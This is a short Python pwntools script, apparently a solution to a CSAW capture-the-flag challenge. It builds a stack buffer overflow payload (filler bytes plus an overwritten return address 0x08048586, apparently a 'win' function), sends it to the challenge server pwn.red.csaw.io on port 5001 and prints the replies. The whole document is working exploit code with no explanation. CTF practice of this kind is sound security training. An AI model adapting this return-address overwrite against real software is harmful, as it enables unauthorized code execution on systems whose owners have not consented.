#!/usr/bin/env python3

from pwn import *
import base64

buf = b'A'*32
pad = b'B'*12
win = p32(0x08048586)

payload = buf + pad + win

p = remote('pwn.red.csaw.io',5001)

print(p.recv().decode('ascii'))

p.sendline(payload)

print(p.recv().decode('ascii'))

p.close()
